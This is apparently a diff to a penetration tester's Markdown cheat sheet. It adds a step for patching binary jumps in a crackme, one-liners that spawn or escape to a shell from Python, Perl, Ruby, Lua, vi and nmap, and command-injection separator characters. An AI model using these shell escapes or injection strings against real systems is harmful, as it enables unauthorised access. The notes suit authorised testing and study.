@@ -727,4 +727,32 @@ do all in vm
 5) searh for all refeed text strings (double click on an error message & success (set breakpoints)
 6) Dobule click in cpu for breakpoint
 7) inspect jumps
-8) mo
+8) modify jumps to not take errors
+```
+
+##Shell Spawning
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+echo os.system('/bin/bash')
+/bin/sh -i
+perl —e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+(From within IRB)
+exec "/bin/sh"
+(From within vi)
+:!bash
+(From within vi)
+:set shell=/bin/bash:shell
+(From within nmap)
+!sh
+```
+##Command Injection
+```
+;
+&&
+|
+||
+...
+```
